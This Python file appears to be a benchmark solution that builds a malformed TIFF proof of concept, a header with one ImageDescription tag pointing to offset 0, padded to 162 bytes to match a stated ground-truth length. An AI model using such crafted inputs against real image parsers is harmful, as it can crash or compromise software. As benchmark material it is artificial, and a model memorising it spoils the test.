import os
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # TIFF header for little-endian
        tiff_header = b'II\x2A\x00\x08\x00\x00\x00'
        
        # IFD entries count (1 entry)
        ifd_count = struct.pack('<H', 1)
        
        # Create a tag with invalid offset (0)
        # Use an arbitrary tag number that expects data, e.g., 270 (ImageDescription)
        # Type = ASCII (2), Count > 4 so it requires external storage
        tag_entry = struct.pack('<HHI', 270, 2, 10)  # Tag, Type, Count
        tag_entry += struct.pack('<I', 0)  # Offset = 0 (invalid)
        
        # Next IFD offset (0 = end)
        next_ifd = b'\x00\x00\x00\x00'
        
        # Combine all parts
        poc = tiff_header + ifd_count + tag_entry + next_ifd
        
        # Pad to match ground-truth length of 162 bytes
        # Add dummy data to reach exact length while keeping structure valid
        remaining = 162 - len(poc)
        if remaining > 0:
            poc += b'A' * remaining
        
        return poc
